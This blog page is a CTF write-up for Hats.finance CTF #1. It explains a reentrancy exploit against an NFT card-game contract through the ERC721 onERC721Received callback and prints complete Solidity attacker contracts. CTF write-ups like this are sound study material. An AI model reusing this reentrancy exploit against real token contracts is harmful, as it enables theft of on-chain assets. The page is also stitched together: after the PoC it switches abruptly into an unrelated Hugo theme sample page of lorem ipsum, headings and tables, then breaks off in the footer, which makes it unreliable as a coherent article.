<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  
  <meta name="author" content="merkleplant">

  
  
  <meta name="description" content="Article providing a walkthrough of hats’ first CTF challenge, and the solution I came up with">
  

  
  <link rel="icon" href="http://localhost:1313/favicon.ico">

  
  
  <meta name="keywords" content=" hugo  latex  theme ">
  

  
  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"
  integrity="sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"
  integrity="sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"
  integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      delimiters: [
        { left: '$$', right: '$$', display: true },
        { left: '\\[', right: '\\]', display: true },
        { left: '$', right: '$', display: false },
        { left: '\\(', right: '\\)', display: false }
      ],
      ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'option'],
      throwOnError: false
    });
  });
</script>


  

  
  <meta property="og:title" content="Solution to Hats.finance CTF #1" />
<meta property="og:description" content="Article providing a walkthrough of hats’ first CTF challenge, and the solution I came up with" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/articles/solution-to-hatsfinance-ctf-1/" /><meta property="article:section" content="articles" />
<meta property="article:published_time" content="2022-05-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-05-16T00:00:00+00:00" />



  
  <link rel="canonical" href="http://localhost:1313/articles/solution-to-hatsfinance-ctf-1/">

  
  
  <meta itemprop="name" content="Solution to Hats.finance CTF #1">
<meta itemprop="description" content="Article providing a walkthrough of hats’ first CTF challenge, and the solution I came up with"><meta itemprop="datePublished" content="2022-05-16T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-05-16T00:00:00+00:00" />
<meta itemprop="wordCount" content="1787">
<meta itemprop="keywords" content="" />

  
  <link media="screen" rel="stylesheet" href='http://localhost:1313/css/common.css'>
  <link media="screen" rel="stylesheet" href='http://localhost:1313/css/content.css'>

  
  
  <title>Solution to Hats.finance CTF #1 - merkleplant&#39;s garden </title>
  

  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Solution to Hats.finance CTF #1"/>
<meta name="twitter:description" content="Article providing a walkthrough of hats’ first CTF challenge, and the solution I came up with"/>


  
<link rel="stylesheet" href='http://localhost:1313/css/single.css'>

</head>

<body>
  <div id="wrapper">
    <header id="header">
  <h1>
    <a href="http://localhost:1313/">merkleplant&#39;s garden </a>
  </h1>

  <nav>
    
    <span class="nav-bar-item">
      <a class="link" href="/">Articles</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="/wikis/">Wikis</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="https://merkleplant.xyz">About</a>
    </span>
    
  </nav>
</header>

    
<main id="main" class="post">
  
  <article class="content">
    <h1 id="solution-to-hatsfinance-ctf-1">Solution to Hats.finance CTF #1</h1>
<p>Hats.finance is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.</p>
<p>This post provides a quick walkthrough of hats’ first challenge and the solution I came up with.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>Provided was a <code>Game.sol</code> contract that encodes a card fighting game where the goal is to obtain a flag by pitching your deck of cards (called <em>Mons</em>) against the deck of the flag holder and win the fight. You can find the GitHub repo here.</p>
<p>After joining the game, using <code>Games#join()</code>, a wallet receives their 3 Mons as
NFTs.</p>
<p>Initiating a fight happens through the <code>Games#fight()</code> function. Two notable implementation
details are:</p>
<ul>
<li>Even with the best deck of Mons possible (every Mon 9/9), an attacker would
lose against the current flag holder because they also hold a deck of 9/9
cards, and in case of a draw the current flag holder wins</li>
<li>The winner of a fight is whoever holds more Mons after the fight</li>
</ul>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic">// winner is the player with most Mons left
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span><span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">attacker</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#ce5c00;font-weight:bold">&gt;</span> <span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">opponent</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">flagHolder</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">attacker</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><h2 id="the-idea">The Idea</h2>
<p>What if it would be possible to increase the number of Mons held in one wallet?</p>
<p>If a wallet would hold 7 Mons it would win against the current flag holder. 3 Mons would be burned from the attacker’s wallet during the fight, leaving 4 Mons in the attacker’s wallet and 3 Mons in the flag holder’s wallet after the fight is over. This leads to the attacker being selected as the winner.</p>
<p>Finding a way to increase a wallet’s Mon balance
Going through the code trying to find a way to increase a wallet’s Mon balance, the Games#swap(address to, uint monId1, uint monId2) function looks promising.</p>
<p>It is the only public callable function that transfers Mon NFTs between wallets.</p>
<p>The Mon cards are implemented as ERC721s, building upon the OpenZeppelin library. The swap function transfers the NFTs using OpenZeppelin’s ERC721#_safeTransfer(address to, uint id) function.</p>
<p>Checking the deps
OpenZeppelin’s ERC721#_safeTransfer function looks like this (link):</p>
<p>function _safeTransfer(
address from,
address to,
uint256 tokenId,
bytes memory data
) internal virtual {
_transfer(from, to, tokenId);
require(_checkOnERC721Received(from, to, tokenId, data), &ldquo;ERC721: transfer to non ERC721Receiver implementer&rdquo;);
}
The function first transfers the NFT to the receiver address and afterwards checks that the receiver is an ERC721Receiver.</p>
<p>What is an ERC721Receiver? What exactly does the _checkOnERC721Received function do?</p>
<p>function _checkOnERC721Received(
address from,
address to,
uint256 tokenId,
bytes memory data
) private returns (bool) {
if (to.isContract()) {
try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {
return retval == IERC721Receiver.onERC721Received.selector;
} catch (bytes memory reason) {
// Error handling omitted.
}
} else {
return true;
}
}
An ERC721Receiver, as implemented in the function, is:</p>
<p>An EOA address
A contract that returns ERC721’s onERC721Received function selector when called via the onERC721Received function
Back to the Game
Quite literally, the winning move is going back to the game.</p>
<p>Let’s recap:</p>
<p>Calling the Games#fight() function with a wallet holding 7 Mons wins the game
Transfer of NFTs between wallets is only possible through the Games#swap() function
Directly after a Mon transfer, the receiver is called via the ERC721#onERC721Received() function
The solution is to use the ERC721#onERC721Received() callback to reenter the game.</p>
<p>Capture the Flag
A path to capture the flag would then be:</p>
<p>Create a few fren wallets, each joining the game and holding 3 Mons
Create an attacker contract and join the game
Call the Games#swap() function from a fren wallet to transfer a Mon to the attacker wallet
The attacker uses the ERC721 callback function, in which they hold 4 Mons, to let a fren wallet send him another Mon
Repeat the last step until the attacker’s wallet holds at least 7 Mons
If the attacker holds at least 7 Mons while being called via onERC721Received(), attack the flag holder via Games#fight()
Implementing the PoC
We need two different contracts, the user fren contracts from which the attacker borrows NFTs, and the attacker contract that reenters the game when called via onERC721Received().</p>
<p>You can find the whole repo here.</p>
<p>Let’s start with the User contract:</p>
<p>contract User {
// The attacker&rsquo;s address.
address private immutable solution;
// The game&rsquo;s address.
IGame private immutable game;
// Our deck, i.e. our 3 Mon NFTs.
uint[3] private deck;</p>
<pre><code>constructor(address game_) {
    solution = msg.sender;
    game = IGame(game_);
}

function joinGame() external {
    deck = game.join();
    require(
        game.balanceOf(address(this)) == 3,
        &quot;User#joinGame: Joinig game failed&quot;
    );
}

// Note that a Mon needs to be flagged as `upForSale` before a swap
// can be initiated.
function putUpForSale() external {
    game.putUpForSale(deck[0]);
    game.putUpForSale(deck[1]);
    game.putUpForSale(deck[2]);
}

// Swap an own Mon with some Mon from the attacker.
// This function is called by the attacker.
function attack(uint idx, uint wantId) external {
    game.swap(solution, deck[idx], wantId);
}

function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
}
</code></pre>
<p>}
The attacker will call the attack() function, initiating a swap from a Mon from the user’s wallet to a Mon from the attacker’s wallet.</p>
<p>Going further, let’s check out the attacker contract, called Solution:</p>
<p>contract Solution {
// The game&rsquo;s address.
IGame private immutable game;
// Our deck, i.e. our 3 Mon NFTs.
uint[3] private deck;</p>
<pre><code>// The two fren contracts to borrow Mon NFTs from.
User u1;
User u2;

constructor(address game_) {
    game = IGame(game_);

    // Join game, receive 3 NFTs.
    deck = game.join();
    require(
        game.balanceOf(address(this)) == 3,
        &quot;Solution: Joinig game failed&quot;
    );
}

// Function to start the attack.
function captureFlag() external {
    // Put own NFT's for sale.
    game.putUpForSale(deck[0]);
    game.putUpForSale(deck[1]);
    game.putUpForSale(deck[2]);

    // Deploy 2 User frens.
    u1 = new User(address(game));
    u2 = new User(address(game));

    // Let user's join game.
    u1.joinGame();
    u2.joinGame();

    // Let user's NFTs put up for sale.
    u1.putUpForSale();
    u2.putUpForSale();

    // Start attack.
    u1.attack(0, 8);
}

// This function is being called during a swap we initiated with
// a `&lt;User&gt;.attack()` call.
function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    uint balance = game.balanceOf(address(this));

    // During the fight we will lose 3 NFTs. In order to still have a
    // higher balance than the current flagHolder, we need 7 NFTs.

    if (balance == 4) {
        // Continue with attack.
        u1.attack(1, 6);
    } else if (balance == 5) {
        // Continue with attack.
        u1.attack(2, 7);
    } else if (balance == 6) {
        // Continue with attack.
        u2.attack(0, 9);
    } else {
        // Initiate fight...
        game.fight();
        // ...and make sure we won.
        require(game.flagHolder() == address(this));
    }

    // Afterwards return the correct function selector to make OZ's
    // `_safeTransfer()` function pass.
    return IERC721Receiver.onERC721Received.selector;
}
</code></pre>
<p>}
The function captureTheFlag() initiates the attack. It marks their own Mon NFTs as upForSale and sets up the two User contracts. Lastly, it starts the attack by starting a swap with a user’s wallet and the attacker’s one.</p>
<p>The attacker contract will then be called back via the onERC721Received() function, in which a next swap is initiated as long as the Mon NFT balance is less than seven.</p>
<p>If the Mon NFT balance is sufficient, the Game#fight() function is called.</p>
<p>To make OZ’s _safeTransfer() function pass after we won the game (remember, all the NFT swaps are not yet fully executed), we return the expected function selector.</p>
<p>This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.</p>
<h2 id="headings">Headings</h2>
<p>The following HTML <code>&lt;h1&gt;</code>—<code>&lt;h6&gt;</code> elements represent six levels of section headings. <code>&lt;h1&gt;</code> is the highest section level while <code>&lt;h6&gt;</code> is the lowest.</p>
<h1 id="h1">H1</h1>
<h2 id="h2">H2</h2>
<h3 id="h3">H3</h3>
<h4 id="h4">H4</h4>
<h5 id="h5">H5</h5>
<h6 id="h6">H6</h6>
<h2 id="paragraph">Paragraph</h2>
<p>Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.</p>
<p>Itatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.</p>
<h2 id="blockquotes">Blockquotes</h2>
<p>The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a <code>footer</code> or <code>cite</code> element, and optionally with in-line changes such as annotations and abbreviations.</p>
<h4 id="blockquote-without-attribution">Blockquote without attribution</h4>
<blockquote>
<p>Tiam, ad mint andaepu dandae nostion secatur sequo quae.
<strong>Note</strong> that you can use <em>Markdown syntax</em> within a blockquote.</p>
</blockquote>
<h4 id="blockquote-with-attribution">Blockquote with attribution</h4>
<blockquote>
<p>Don&rsquo;t communicate by sharing memory, share memory by communicating.<br>
— <cite>Rob Pike<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></cite></p>
</blockquote>
<h2 id="tables">Tables</h2>
<p>Tables aren&rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Age</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bob</td>
<td>27</td>
</tr>
<tr>
<td>Alice</td>
<td>23</td>
</tr>
</tbody>
</table>
<h4 id="inline-markdown-within-tables">Inline Markdown within tables</h4>
<table>
<thead>
<tr>
<th>Italics</th>
<th>Bold</th>
<th>Code</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>italics</em></td>
<td><strong>bold</strong></td>
<td><code>code</code></td>
</tr>
</tbody>
</table>
<h2 id="code-blocks">Code Blocks</h2>
<h4 id="code-block-with-backticks">Code block with backticks</h4>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">User</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The attacker&#39;s address.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">immutable</span> <span style="color:#000">solution</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The game&#39;s address.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000">IGame</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">immutable</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Our deck, i.e. our 3 Mon NFTs.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">uint</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">]</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#000">deck</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">constructor</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">game_</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">solution</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87">msg</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">sender</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">IGame</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game_</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">joinGame</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">deck</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">join</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>            <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">this</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>            <span style="color:#4e9a06">&#34;User#joinGame: Joinig game failed&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Note that a Mon needs to be flagged as `upForSale` before a swap
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// can be initiated.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">2</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Swap an own Mon with some Mon from the attacker.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// This function is called by the attacker.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">uint</span> <span style="color:#000">idx</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">uint</span> <span style="color:#000">wantId</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">swap</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">solution</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#000">idx</span><span style="color:#000;font-weight:bold">],</span> <span style="color:#000">wantId</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">operator</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#000">calldata</span> <span style="color:#204a87">data</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#204a87;font-weight:bold">returns</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bytes4</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">return</span> <span style="color:#000">IERC721Receiver</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">selector</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">html</span> <span style="color:#c4a000">lang</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#4e9a06">&#34;en&#34;</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">head</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">meta</span> <span style="color:#c4a000">charset</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#4e9a06">&#34;utf-8&#34;</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">title</span><span style="color:#000;font-weight:bold">&gt;</span>Example HTML5 Document<span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">title</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">head</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">body</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">p</span><span style="color:#000;font-weight:bold">&gt;</span>Test<span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">p</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">body</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">html</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span></code></pre></div><h4 id="code-block-indented-with-four-spaces">Code block indented with four spaces</h4>
<pre><code>&lt;!doctype html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta charset=&quot;utf-8&quot;&gt;
  &lt;title&gt;Example HTML5 Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;p&gt;Test&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h4 id="code-block-with-hugos-internal-highlight-shortcode">Code block with Hugo&rsquo;s internal highlight shortcode</h4>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">html</span> <span style="color:#c4a000">lang</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#4e9a06">&#34;en&#34;</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">head</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">meta</span> <span style="color:#c4a000">charset</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#4e9a06">&#34;utf-8&#34;</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">title</span><span style="color:#000;font-weight:bold">&gt;</span>Example HTML5 Document<span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">title</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">head</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">body</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#000;font-weight:bold">&lt;</span><span style="color:#204a87;font-weight:bold">p</span><span style="color:#000;font-weight:bold">&gt;</span>Test<span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">p</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">body</span><span style="color:#000;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">&lt;/</span><span style="color:#204a87;font-weight:bold">html</span><span style="color:#000;font-weight:bold">&gt;</span></span></span></code></pre></div>
<h2 id="list-types">List Types</h2>
<h4 id="ordered-list">Ordered List</h4>
<ol>
<li>First item</li>
<li>Second item</li>
<li>Third item</li>
</ol>
<h4 id="unordered-list">Unordered List</h4>
<ul>
<li>List item</li>
<li>Another item</li>
<li>And another item</li>
</ul>
<h4 id="nested-list">Nested list</h4>
<ul>
<li>Fruit
<ul>
<li>Apple</li>
<li>Orange</li>
<li>Banana</li>
</ul>
</li>
<li>Dairy
<ul>
<li>Milk</li>
<li>Cheese</li>
</ul>
</li>
</ul>
<h2 id="other-elements--abbr-sub-sup-kbd-mark">Other Elements — abbr, sub, sup, kbd, mark</h2>
<p><abbr title="Graphics Interchange Format">GIF</abbr> is a bitmap image format.</p>
<p>H<sub>2</sub>O</p>
<p>X<sup>n</sup> + Y<sup>n</sup> = Z<sup>n</sup></p>
<p>Press <kbd><kbd>CTRL</kbd>+<kbd>ALT</kbd>+<kbd>Delete</kbd></kbd> to end the session.</p>
<p>Most <mark>salamanders</mark> are nocturnal, and hunt for insects, worms, and other small creatures.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>The above quote is excerpted from Rob Pike&rsquo;s <a href="https://www.youtube.com/watch?v=PAAkCSZUG1c">talk</a> during Gopherfest, November 18, 2015.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
  </article>
  
</main>

    <footer id="footer">
  <div>
    <span>© 2022</span> - <span>2022</span>
  </div>

  <div>
    <span>Powered by </span>
    <a class="link" href="https://gohugo.io/">Hugo</a>
    <span> 🍦 Theme </span>
    <a class="link" href="https://github.com/queensferryme/hugo-theme-texify">TeXify</a>
  </div>

  <div class="footnote">
